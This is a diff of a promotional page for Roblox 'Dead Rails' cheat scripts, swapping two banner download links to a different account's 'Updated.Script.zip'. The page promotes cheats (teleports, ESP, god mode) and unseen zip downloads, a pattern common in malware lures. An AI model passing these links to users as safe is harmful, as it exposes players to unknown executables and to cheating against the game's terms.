@@ -3,10 +3,10 @@
 **Looking for the best Roblox Dead Rails Script in 2025?** Whether you're trying to gain a competitive advantage, unlock secret abilities, or just have fun exploring new features, this is your ultimate resource for working Dead Rails scripts. Updated regularly and optimized for performance, these scripts give you access to **teleports, ESP, auto farm, god mode, and more**.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
+](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
 
 
 In this complete guide, we’ll walk you through what a Dead Rails script is, how to use it, where to get it safely, and why thousands of Roblox players are using them today.
